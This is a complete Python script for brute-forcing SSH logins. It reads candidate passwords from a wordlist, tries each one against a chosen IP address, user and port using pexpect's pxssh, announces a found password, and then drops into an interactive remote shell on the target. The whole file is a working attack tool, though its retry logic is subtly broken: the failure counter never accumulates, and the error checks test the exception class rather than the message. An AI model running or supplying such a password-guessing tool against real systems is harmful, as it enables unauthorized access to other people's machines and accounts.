#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time


GREEN = '\033[92m'
Blue = '\033[94m'
Cyan = '\033[96m'
Magenta = '\033[95m'
Grey = '\033[90m'
Black = '\033[90m'
RED = '\033[91m'
PURPLE = '\033[95m'
YEL = '\033[93m'
WHITE = '\033[37m'
ENDC = '\033[0m'
Default = '\033[99m'


def connect(ip, user, passwd, port):
	fail = 0

	try:
		ssh = pxssh.pxssh() # ssh connection setup
		ssh.login(ip, user, passwd, port) # cred login
		print(Cyan+'''
[+] Password Found:''',  passwd+'\n'+ENDC)
		return ssh

	except KeyboardInterrupt:
		print(RED+"\n\n[-] User interrupted with Keyboard"+ENDC)
		exit(0)

	except Exception:
		if fail > 5:
			print(RED+"[-] !!! To Many Socket Timeout"+ENDC) 
			exit(0)
		elif 'read_nonblocking' in str(Exception):
			fail += 1
			time.sleep(5)
			return connect(ip, user, passwd, port)
		elif 'synchronize with original prompt' in str(Exception):
			time.sleep(1)
			return connect(ip, user, passwd, port)

		return None


def Main():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("user", help="Specify Target User")
	parser.add_argument("file", help="Specify Wordlist")
	parser.add_argument("port", help="Port Number")

	args = parser.parse_args()

	if args.ip and args.user and args.file and args.port:
		with open(args.file, 'r') as lines:
			for line in lines: # reading a line from lines in file
				passwd = line.strip("\r\n")
				print(WHITE+"[*] Testing: ", args.user+":"+str(passwd)+ENDC)
				conn = connect(args.ip, args.user, passwd, args.port)
				if conn:
					print(GREEN+'''[+] SSH connected!!, Type: exit to quit: 
					'''+ENDC)
					command = input(args.user+'@'+args.ip+':$ ')
					while command != 'exit':
						conn.sendline(command)
						conn.prompt()
						print(conn.before.decode("utf-8"))
						command = input(args.user+'@'+args.ip+':$ ')
						
					else:
						print(YEL+'''
Bye!
							'''+ENDC)
						exit(0)
	else:
			print(parser.usage)
			exit(0)


if __name__ == '__main__':
	Main()

